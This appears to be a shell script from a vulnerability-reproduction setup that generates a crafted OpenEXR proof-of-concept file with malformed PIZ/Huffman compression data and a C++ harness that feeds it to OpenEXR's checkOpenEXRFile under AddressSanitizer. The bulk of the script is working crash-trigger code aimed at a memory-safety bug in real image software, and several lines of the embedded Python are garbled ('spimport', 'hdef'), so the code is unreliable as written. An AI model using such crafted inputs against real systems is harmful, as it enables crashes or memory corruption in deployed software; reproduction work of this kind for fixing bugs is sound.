# Create a self-contained script that generates the PoC and test harness in the build env


cat > /workspace/run_test.sh << 'SCRIPTEOF'
#!/bin/bash
set -e
cd /gt/_work/src
/# Create the PoC EXR file
python3 -c "
spimport struct
hdef create_exr_poc():
    magic = struct.pack('<I', 0x01312f76)
    version = struct.pack('<H', 2)

    header = b''

    chlist_value = b'Y\x00' + struct.pack('<i', 1) + struct.pack('<B', 0) + b'\x00\x00\x00' + struct.pack('<i', 1) + struct.pack('<i', 1) + b'\x00'
    header += b'channels\x00' + b'chlist\x00' + struct.pack('<I', len(chlist_value)) + chlist_value

    header += b'compression\x00' + b'compression\x00' + struct.pack('<I', 1) + struct.pack('<B', 1)

    dataWindow = struct.pack('<iiii', 0, 0, 0, 0)
    header += b'dataWindow\x00' + b'box2i\x00' + struct.pack('<I', 16) + dataWindow

    displayWindow = struct.pack('<iiii', 0, 0, 0, 0)
    header += b'displayWindow\x00' + b'box2i\x00' + struct.pack('<I', 16) + displayWindow

    header += b'lineOrder\x00' + b'lineOrder\x00' + struct.pack('<I', 1) + struct.pack('<B', 0)

    header += b'pixelAspectRatio\x00' + b'float\x00' + struct.pack('<I', 4) + struct.pack('<f', 1.0)

    screenWindowCenter = struct.pack('<ff', 0.0, 0.0)
    header += b'screenWindowCenter\x00' + b'v2f\x00' + struct.pack('<I', 8) + screenWindowCenter

    header += b'screenWindowWidth\x00' + b'float\x00' + struct.pack('<I', 4) + struct.pack('<f', 1.0)

    header += b'\x00'

    offset_table = struct.pack('<Q', 0)

    im = 0
    iM = 21
    tableLength = 17
    nBits = 129
    future = 0

    table_data = b'\x00' * 15 + b'\xC0' + b'\x0F'
    bitstream = b'\x00' * 17

    huffman_data = struct.pack('<IIIII', im, iM, tableLength, nBits, future) + table_data + bitstream
    hufbytes = len(huffman_data)

    minNonZero = 0
    maxNonZero = 0
    piz_data = struct.pack('<HH', minNonZero, maxNonZero) + struct.pack('<I', hufbytes) + huffman_data

    chunk_y = 0
    chunk_data = struct.pack('<iI', chunk_y, len(piz_data)) + piz_data

    offset = len(magic) + len(version) + len(header) + len(offset_table)
    offset_table = struct.pack('<Q', offset)

    with open('/tmp/poc.exr', 'wb') as f:
        f.write(magic)
        f.write(version)
        f.write(header)
        f.write(offset_table)
        f.write(chunk_data)

    print(f'Created /tmp/poc.exr, size: {offset + len(chunk_data)}')
create_exr_poc()
"
# Create test harness
cat > /tmp/test_poc.cpp << 'CPPEOF'
#include <ImfNamespace.h>
#include <ImfCheckFile.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
using OPENEXR_IMF_NAMESPACE::checkOpenEXRFile;
int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <file>\n", argv[0]);
        return 1;
    }

    FILE* f = fopen(argv[1], "rb");
    if (!f) {
        fprintf(stderr, "Cannot open file\n");
        return 1;
    }

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);

    uint8_t* data = (uint8_t*)malloc(size);
    fread(data, 1, size, f);
    fclose(f);

    checkOpenEXRFile((const char*)data, size, true, true, true);

    free(data);
    return 0;
}
CPPEOF
# Build with ASan
mkdir -p /tmp/build_asan
cd /tmp/build_asan
cmake /gt/_work/src -DCMAKE_BUILD_TYPE=Debug -DBUILD_TESTING=OFF -DOPENEXR_BUILD_TOOLS=OFF -DCMAKE_C_FLAGS="-fsanitize=address -g" -DCMAKE_CXX_FLAGS="-fsanitize=address -g" -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" 2>&1 | tail -5
make -j$(nproc) 2>&1 | tail -5
# Compile test harness
g++ -fsanitize=address -g -I/gt/_work/src/src/lib/OpenEXR -I/gt/_work/src/src/lib/OpenEXRCore -I/gt/_work/src/src/lib/OpenEXRUtil -I/tmp/build_asan -o /tmp/test_poc /tmp/test_poc.cpp -L/tmp/build_asan/src/lib/OpenEXRUtil -L/tmp/build_asan/src/lib/OpenEXR -L/tmp/build_asan/src/lib/OpenEXRCore -lOpenEXRUtil-3_2_d -lOpenEXR-3_2_d -lOpenEXRCore-3_2_d -lIex-3_2_d -lIlmThread-3_2_d -lImath-3_2_d 2>&1
# Run with ASan
LD_LIBRARY_PATH=/tmp/build_asan/src/lib/OpenEXRUtil:/tmp/build_asan/src/lib/OpenEXR:/tmp/build_asan/src/lib/OpenEXRCore:/tmp/build_asan/src/lib/Iex:/tmp/build_asan/src/lib/IlmThread:/tmp/build_asan/src/lib/Imath ASAN_OPTIONS=detect_leaks=0 /tmp/test_poc /tmp/poc.exr 2>&1
SCRIPTEOF
